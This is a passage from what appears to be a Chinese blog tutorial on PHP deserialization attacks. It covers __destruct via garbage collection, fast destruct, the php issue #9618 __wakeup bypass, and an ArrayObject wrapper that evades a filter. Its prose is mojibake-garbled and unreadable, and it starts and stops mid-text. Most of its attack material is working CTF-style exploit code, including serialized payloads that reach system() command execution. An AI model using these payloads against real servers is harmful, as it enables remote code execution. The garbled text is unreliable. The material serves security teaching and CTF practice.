æ˜¯è¡¨ç¤ºå˜é‡ä¸ªæ•°çš„ï¼Œé‚£ä¹ˆè¿™é‡Œå°±åº”è¯¥æ˜¯1ï¼ŒéªŒè¯ä¸€ä¸‹ã€‚</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_1.png"></p><p>æ¥ä¸‹æ¥æ·»åŠ ä¸€ä¸ªå¼•ç”¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ a çš„ <code>refcount</code> åº”è¯¥æ˜¯ 1ï¼Œ<code>is_ref</code> åº”è¯¥æ˜¯ trueï¼ŒéªŒè¯ä¸€ä¸‹</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_2.png"></p><p>ç»“æœä¸åŒäºæˆ‘ä»¬æ‰€æƒ³çš„ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>å› ä¸ºåŒä¸€å˜é‡å®¹å™¨è¢«å˜é‡ a å’Œå˜é‡ b å…³è”ï¼Œå½“æ²¡å¿…è¦æ—¶ï¼Œphp ä¸ä¼šå»å¤åˆ¶å·²ç”Ÿæˆçš„å˜é‡å®¹å™¨ã€‚ æ‰€ä»¥è¿™ä¸€ä¸ª <code>zval</code> å®¹å™¨å­˜å‚¨äº† a å’Œ b ä¸¤ä¸ªå˜é‡ï¼Œå°±ä½¿å¾— <code>refcount</code> çš„å€¼ä¸º 2ã€‚</p><p>å®¹å™¨çš„é”€æ¯ï¼š</p><p>å½“å‡½æ•°æ‰§è¡Œç»“æŸæˆ–è€…å¯¹å˜é‡è°ƒç”¨äº† <code>unset()</code> å‡½æ•°ï¼Œrefcount å°±ä¼šå‡ 1ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="variable">$b</span> =&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> =&amp;<span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_3.png"></p><h3 id="PHP-GC-å›æ”¶æœºåˆ¶æ”»å‡»é¢"><a href="#PHP-GC-å›æ”¶æœºåˆ¶æ”»å‡»é¢" class="headerlink" title="PHP GC å›æ”¶æœºåˆ¶æ”»å‡»é¢"></a>PHP GC å›æ”¶æœºåˆ¶æ”»å‡»é¢</h3><ul><li>åŸç†ï¼šå½“ <code>is_ref</code> å‡å°‘æ—¶ï¼Œä¼šè§¦å‘ <code>__destuct</code> é­”æœ¯æ–¹æ³•ï¼Œç”±æ­¤äº§ç”Ÿçš„ä¸€äº› trick ç±»å‹æ”»å‡»</li></ul><p>å˜é‡è¢«<code>unset</code>å‡½æ•°å¤„ç†ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;num = <span class="variable">$num</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__destruct()&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">2</span>); </span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="number">3</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_4.png"></p><p>å½“å¯¹è±¡ä¸º<code>NULL</code>æ—¶ä¹Ÿæ˜¯å¯ä»¥è§¦å‘<code>__destruct</code>çš„ã€‚</p><p>åœ¨ä¸€ä¸ª array é‡Œé¢å­˜åœ¨ä¸€ä¸ªé”®å€¼å¯¹ï¼Œvalue ä¸ºæŸä¸ªç±»ï¼Œå½“è¿™ä¸ªç±»ä¸º NULL çš„æ—¶å€™ï¼Œä¼šè¢«è®¤ä¸ºæ˜¯ <code>is_ref</code> ä¸º 0ï¼Œä¹Ÿå°±æ˜¯ falseã€‚è¿™å°±å¯ä»¥è§¦å‘åˆ° <code>__destruct</code> æ–¹æ³•</p><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºæœ‰å¼‚å¸¸å¤„ç†ï¼Œæ‰€ä»¥æ­£å¸¸æƒ…å†µä¸‹æ˜¯æ— æ³•<code>__destruct</code>ï¼Œè¿™æ—¶æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨GCå›æ”¶æœºåˆ¶æ¥è§¦å‘<code>__destruct</code>ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="keyword">new</span> B,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°åºåˆ—åŒ–æ–‡æœ¬å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span><br><span class="line">å¯¹è±¡ç±»å‹:å¯¹è±¡ä¸ªæ•°:&#123;ç±»å‹:é•¿åº¦:é”®å;ç±»å‹:é•¿åº¦:ç±»å:å€¼ç±»å‹:é•¿åº¦:é”®å;ç±»å‹;&#125;</span><br><span class="line">æ•°ç»„:å¯¹è±¡ä¸ªæ•°ä¸º2:&#123;strå‹:é•¿åº¦1:é”®åä¸º&quot;a&quot;;ç±»:é•¿åº¦ä¸º1:ç±»åä¸º&quot;B&quot;:å€¼ä¸º0 strå‹:å€¼ä¸º1:é”®åä¸º&quot;b&quot;:NULLå‹;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬å°†é”®å<code>b</code>æ”¹æˆ<code>a</code>ï¼Œå³åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šä¸‹å…ˆè®©<code>a</code>èµ‹å€¼ä¸ºç±»<code>B</code>ï¼Œä¹‹åå†å°†<code>a</code>èµ‹å€¼ä¸º<code>NULL</code>ï¼Œä½†ä¸€å¼€å§‹<code>a</code>å·²ç»æ˜¯å¯¹è±¡äº†ï¼Œèµ‹å€¼ä¸º<code>NULL</code>æ—¶å°±ä¼šå‡ºç°å¯¹è±¡ä¸º<code>NULL</code>çš„æƒ…å†µï¼Œä»è€Œè§¦å‘<code>__destruct</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;a&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_5.png"></p><p>è¿™ä¸ªæ˜¯åœ¨ååºåˆ—åŒ–ä¸­ç»å¸¸ä½¿ç”¨çš„æ–¹æ³•ã€‚</p><h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h2><p>çŸ¥è¯†ç‚¹ï¼š</p><p><em>1ã€PHPä¸­ï¼Œå¦‚æœå•ç‹¬æ‰§è¡Œunserializeå‡½æ•°è¿›è¡Œå¸¸è§„çš„ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–åçš„æ•´ä¸ªå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä»…é™äºè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œå½“è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿™ä¸ªç±»å°±æ²¡äº†ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šæ‰§è¡Œå®ƒã€‚</em></p><p><em>2ã€PHPä¸­ï¼Œå¦‚æœç”¨ä¸€ä¸ªå˜é‡æ¥ä½ååºåˆ—åŒ–å‡½æ•°çš„è¿”å›å€¼ï¼Œé‚£ä¹ˆè¢«ååºåˆ—åŒ–çš„å¯¹è±¡å…¶ç”Ÿå‘½å‘¨æœŸå°±ä¼šå˜é•¿ï¼Œç”±äºå®ƒä¸€ç›´éƒ½å­˜åœ¨äºè¿™ä¸ªå˜é‡å½“ä¸­ï¼Œé‚£ä¹ˆåœ¨PHPè„šæœ¬èµ°å®Œæµç¨‹ä¹‹åï¼Œè¿™ä¸ªå¯¹è±¡æ‰ä¼šè¢«é”€æ¯ï¼Œåœ¨æœ‰ææ„å‡½æ•°çš„æƒ…å†µä¸‹å°±ä¼šå°†å…¶æ‰§è¡Œã€‚</em></p><p>fast destruct å°±æ˜¯ç”¨æ¥è§£å†³ç¬¬äºŒç§æƒ…å†µå¸¦æ¥çš„é—®é¢˜çš„ã€‚</p><p><strong>è§£æ³•ä¸€</strong></p><p>å½“éœ€è¦æ„é€ popé“¾çš„æ—¶å€™ï¼Œååºåˆ—åŒ–åçš„å¯¹è±¡è¢«å˜é‡æ¥ä½äº†ï¼Œåˆè¦åˆ©ç”¨ææ„å‡½æ•°æ§åˆ¶POPé“¾çš„æµç¨‹ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°å¿«é€Ÿææ„çš„æŠ€å·§ã€‚</p><p>è€Œä¸”ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨ç±»å’Œç±»ä¹‹é—´å„æœ‰åˆ†å·¥ï¼Œåœ¨å†…éƒ¨è”ç³»ä¸æ˜¯å¾ˆç´§å¯†çš„æƒ…å†µä¸‹ä½¿ç”¨è¿™ç§æŠ€å·§ã€‚</p><p>ä½¿ç”¨ç´¢å¼•ç›¸åŒçš„ä¸¤ä¸ªç±»ï¼Œåä¸€ä¸ªç±»è¢«ååºåˆ—åŒ–æ—¶ï¼Œå‰ä¸€ä¸ªç±»ä¼šè¢«é”€æ¯ï¼Œä»è€Œè°ƒç”¨ææ„å‡½æ•°ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚</p><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="keyword">array</span>(<span class="number">0</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class1</span>(),<span class="number">1</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class2</span>(),<span class="number">2</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class3</span>(),<span class="number">1</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class4</span>(),<span class="number">2</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class5</span>()));</span><br><span class="line"><span class="variable">$target</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$unser</span>);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ•´ä¸ªæµç¨‹å¦‚ä¸‹:</p><p><em>class1è¢«ååºåˆ—åŒ–</em></p><p><em>class2è¢«ååºåˆ—åŒ–</em></p><p><em>class3è¢«ååºåˆ—åŒ–</em></p><p><em>class4è¢«ååºåˆ—åŒ–ï¼Œclass2è¢«é”€æ¯</em></p><p><em>class5è¢«ååºåˆ—åŒ–ï¼Œclass3è¢«é”€æ¯</em></p><p>æ³¨æ„ï¼Œä½¿ç”¨è¿™ç§æŠ€å·§å¾—åˆ°çš„æ•°ç»„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶å…ƒç´ å€¼å¿…é¡»ä¾ç„¶æ˜¯æ‹¬å·å†…å…ƒç´ çš„ä¸ªæ•°ï¼Œåªæ˜¯å¯¹åº”çš„keyè¦æ”¹ä¸€ä¸‹ã€‚</p><p>â€œåä¸€ä¸ªç±»â€ å¯ä»¥æ˜¯ä¸€ä¸ªæ— ç”¨çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬æ•°ç»„ã€‚</p><p>å…¶å®å°±æ˜¯ä¸€ç§GCå›æ”¶æœºåˆ¶ã€‚</p><p><strong>è§£æ³•äºŒ</strong></p><p>åœ¨<code>unserialize</code>è¿‡ç¨‹ä¸­æ‰«æå™¨å‘ç°åºåˆ—åŒ–å­—ç¬¦ä¸²æ ¼å¼æœ‰è¯¯å¯¼è‡´çš„æå‰å¼‚å¸¸é€€å‡ºï¼Œä¸ºäº†é”€æ¯ä¹‹å‰å»ºç«‹çš„å¯¹è±¡å†…å­˜ç©ºé—´ï¼Œä¼šç«‹åˆ»è°ƒç”¨å¯¹è±¡çš„<code>__destruct()</code>,æå‰è§¦å‘ååºåˆ—åŒ–é“¾æ¡ã€‚</p><p>è¿™ç§æƒ…å†µåªéœ€è¦ç ´ååŸå…ˆçš„å­—ç¬¦ä¸²æ ¼å¼å³å¯ï¼Œæ¯”å¦‚å»æ‰æœ€åçš„å¤§æ‹¬å·ï¼Œã€‚</p><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:0:&#123;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_4_1.png"></p><h2 id="php-issue-9618"><a href="#php-issue-9618" class="headerlink" title="php issue#9618"></a>php issue#9618</h2><p><a href="https://github.com/php/php-src/issues/9618">php issue#9618</a>æåˆ°äº†æœ€æ–°ç‰ˆwakeup()çš„ä¸€ç§bugï¼Œå¯ä»¥é€šè¿‡åœ¨ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­åŒ…å«å­—ç¬¦ä¸²é•¿åº¦é”™è¯¯çš„å˜é‡åä½¿ååºåˆ—åŒ–åœ¨__wakeupä¹‹å‰è°ƒç”¨__destruct()å‡½æ•°ï¼Œæœ€åç»•è¿‡__wakeup()ï¼Œç‰ˆæœ¬ï¼š</p><ul><li>7.4.x -7.4.30</li><li>8.0.x</li></ul><p>æ ·ä¾‹ï¼ˆphp 8.0.2ï¼‰:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$end</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info-&gt;<span class="title function_ invoke__">func</span>();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$znd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;znd = <span class="string">&quot;exit();&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__call &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$end</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info-&gt;<span class="title function_ invoke__">func</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$znd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;znd = <span class="string">&quot;exit();&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__call &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;info=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;znd&quot;;N;&#125;s:6:&quot;Aend&quot;;s:1:&quot;1&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_5_1.png"></p><p>å¾ˆæ˜¾ç„¶ï¼Œ<code>wakeup</code>åœ¨æœ€åè§¦å‘ã€‚</p><h2 id="ä½¿ç”¨Cç»•è¿‡"><a href="#ä½¿ç”¨Cç»•è¿‡" class="headerlink" title="ä½¿ç”¨Cç»•è¿‡"></a>ä½¿ç”¨Cç»•è¿‡</h2><p>ä¼—æ‰€å‘¨çŸ¥å¯ä»¥ä½¿ç”¨Cè¿›è¡Œç»•è¿‡wakeupï¼Œä½†è¿™æ ·æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯ä½ æŠŠOæ”¹ä¸ºCåæ˜¯æ²¡åŠæ³•æœ‰å±æ€§çš„ï¼Œé‚£å‡å¦‚éœ€è¦ç”¨å±æ€§å‘½ä»¤æ‰§è¡Œå°±ä¸è¡Œäº†ã€‚</p><p>æ–°æ–¹æ³•æ˜¯ç”¨åŸç”Ÿç±»æŠŠåŸæœ¬çš„ç±»æ‰“åŒ…ä¸€ä¸‹ï¼Œç”Ÿæˆä»¥Cå¼€å¤´çš„payloadã€‚</p><p>è¿™ä¹Ÿæ˜¯ç»•è¿‡<code>/^[Oa]:[/d]+/</code>è¿‡æ»¤çš„æ–¹æ³•ä¹‹ä¸€ã€‚</p><p>æ ·ä¾‹ï¼ˆctfshow æ„šäººæ¯3rd [easy_php]ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[/d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// C:11:&quot;ArrayObject&quot;:60:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>å®ç°äº†unserializeæ¥å£ç±»çš„å¤§æ¦‚ç‡æ˜¯Cæ‰“å¤´ï¼Œåˆ—å‡ºä¸€äº›ä»¥Cå¼€å¤´çš„åŸç”Ÿç±»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplDoublyLinkedList::unserialize</span><br><span class="line">SplQueue::unserialize</span><br><span class="line">SplStack::unserialize</span><br><span 